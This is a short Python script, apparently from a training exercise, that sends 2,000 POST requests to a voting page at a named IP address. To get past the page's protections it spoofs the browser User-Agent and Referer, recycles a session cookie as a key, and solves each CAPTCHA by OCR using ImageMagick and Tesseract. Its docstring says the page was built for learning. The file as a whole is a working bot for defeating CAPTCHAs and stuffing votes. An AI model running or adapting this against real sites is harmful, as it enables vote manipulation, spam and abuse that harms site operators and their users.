#!/usr/bin/python3
"""

Send multiple POST request to http://158.69.76.135/level3.php
Project is for learning purposes only and this page was created for that

"""
import requests
from PIL import Image
import pytesseract
from subprocess import check_output

# Main URL
url = 'http://158.69.76.135/level3.php'

#   url to get the captcha img
captcha_url = 'http://158.69.76.135/captcha.php'

# Open session
with requests.Session() as session:
    #   Create headers. User-Agent to send pettion as windows user,
    #   and referer to keep the page as referer
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': 'http://158.69.76.135/level3.php'
    }

    #   Request to start session
    request = session.get(url)
    #   Get cookie setted
    cookie = session.cookies['HoldTheDoor']

    payload = {
        'id': 904,
        'holdthedoor': 'Submit',
        'key': cookie,
    }

    # Iterate 2000 times to avoid errors
    for petition in range(2000):
        #   As session already has the cookie, make request to get captcha img
        captcha_request = session.get(captcha_url)

        #   Create a neew img and save the bytes gotten from request
        with open("captcha.png", mode="wb") as img_file:
            img_file.write(captcha_request.content)

        #   Open img with Image.open
        img = Image.open("captcha.png")

        # Use imagemagic for processing and resampling image
        check_output(['convert', 'captcha.png', '-colorspace', 'gray',
                      '-threshold', '50%', '-resize', '150%', '-resample',
                      '1000', 'captcha.png'])

        # -psm 8 (treat the image as a single word)
        custom_oem_psm_config = r'--psm 8'
        #   Get the text inside the img
        captcha = pytesseract.image_to_string(
            img, config=custom_oem_psm_config, lang="eng")

        #   Create captcha key on payload with text read from img
        payload['captcha'] = captcha

        #   Post payload obj
        response = session.post(url, data=payload, headers=headers)
        #   as new cookie is set we can get it and set it as a new key
        payload['key'] = session.cookies['HoldTheDoor']
